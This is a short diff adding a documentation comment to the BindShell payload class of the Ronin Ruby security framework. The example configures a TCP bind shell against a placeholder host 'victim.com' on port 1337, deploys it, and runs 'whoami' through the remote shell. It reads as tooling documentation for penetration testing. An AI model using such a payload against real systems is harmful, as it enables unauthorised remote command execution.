@@ -25,6 +25,22 @@ require 'ronin/payloads/helpers/bind_shell'
 
 module Ronin
   module Payloads
+    #
+    # A generic payload for interacting with Bind Shells.
+    #
+    #     require 'ronin/payloads/bind_shell'
+    #
+    #     payload = Ronin::Payloads::BindShell.new
+    #     payload.protocol = :tcp
+    #     payload.host = 'victim.com'
+    #     payload.port = 1337
+    #
+    #     rpc.build!
+    #     rpc.deploy!
+    #
+    #     rpc.shell.whoami
+    #     # => "www"
+    #
     class BindShell < Payload
 
       #
